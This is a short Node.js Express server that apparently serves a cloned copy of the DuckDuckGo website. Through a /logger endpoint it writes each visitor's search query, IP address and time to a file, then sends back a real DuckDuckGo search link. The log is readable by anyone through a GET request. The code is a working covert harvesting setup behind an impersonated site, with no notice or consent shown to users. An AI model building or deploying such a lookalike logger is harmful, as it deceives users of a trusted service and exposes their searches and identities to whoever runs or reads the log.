var express = require('express')
var app = express();
var bodyParser = require('body-parser');
var fs = require('fs');

app.use(bodyParser.json());
app.use(bodyParser.urlencoded());

app.use(express.static('duckduckgo/duckduckgo.com'));

app.post('/logger', (req,res,next) => {
  var host = req.connection.remoteAddress;
  var query = req.body.q;
  fs.appendFile('logFile.txt', 'date=' + (new Date()).toISOString() + ' IP=' + host + ' searchQuery=' + query + '\n', err => {
    if (err) throw err;

  });
  res.send('https://duckduckgo.com/?q=' + query + '&ia=web');
});

app.get('/logger', (req,res,next) => {
  res.sendFile(__dirname + '/logFile.txt');
});

app.listen(3000, () => {
  console.log('Example app listening on port 3000!')
});
